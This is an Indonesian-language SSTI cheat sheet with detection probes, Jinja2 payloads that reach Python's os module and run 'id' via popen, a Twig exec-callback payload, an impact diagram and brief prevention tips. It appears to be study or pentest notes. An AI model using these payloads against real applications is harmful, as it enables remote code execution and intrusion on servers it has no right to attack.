# SSTI (Server-Side Template Injection)

## Deteksi

```text
{{7*7}}       # Jinja2 / Twig
${7*7}        # Expression Language pada beberapa template engine
#{7*7}        # Beberapa template/framework
<%= 7*7 %>    # ERB / template berbasis Ruby
```

**Keterangan:**

```text
Jika hasil evaluasi berubah menjadi 49,
berarti input kemungkinan diproses sebagai ekspresi template.

Contoh:
{{7*7}} → 49
```

> **Catatan:** sintaks yang didukung berbeda-beda tergantung template engine.
> Hasil `49` merupakan indikasi awal dan perlu dikonfirmasi dengan identifikasi
> template engine yang digunakan.

---

## Jinja2 (Python/Flask)

### Identifikasi Template Context

```text
{{ ''.__class__.__mro__[1].__subclasses__() }}
# Mengakses informasi class dan subclass Python
# Dapat digunakan untuk mengetahui objek yang tersedia pada template context
```

### OS Command Execution

```text
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
# Mencoba mengakses modul os melalui global namespace
# Kemudian menjalankan command "id"
```

```text
{{ lipsum.__globals__['os'].popen('id').read() }}
# Memanfaatkan object lipsum untuk mengakses global namespace
```

```text
{{ cycler.__init__.__globals__.os.popen('id').read() }}
# Memanfaatkan object cycler untuk mengakses modul os
```

**Keterangan:**

```text
Input Template
      ↓
Jinja2 memproses ekspresi
      ↓
Akses object / global namespace
      ↓
Akses modul os
      ↓
Command Execution
      ↓
Potensi RCE
```

---

## Twig (PHP)

```text
{{ _self.env.registerUndefinedFilterCallback("exec") }}
{{ _self.env.getFilter("id") }}
```

**Keterangan:**

```text
Memanfaatkan object dan fungsi internal Twig
untuk mencoba memanggil fungsi PHP melalui template.
```

> **Catatan:** payload SSTI sangat bergantung pada versi dan konfigurasi
> template engine. Payload Jinja2 tidak dapat langsung digunakan pada Twig,
> dan sebaliknya.

---

## Dampak SSTI

```text
SSTI
 ↓
Template Injection
 ↓
Akses Template Context
 ↓
Akses Object / Function
 ↓
Potensi Code Execution
 ↓
Potensi RCE
```

### Pencegahan

```text
# Hindari memasukkan input pengguna langsung ke template.
# Gunakan template engine dengan konfigurasi sandbox yang tepat.
# Pisahkan data pengguna dari template/code.
# Terapkan allowlist terhadap input yang diperbolehkan.
# Gunakan prinsip least privilege pada aplikasi.
```
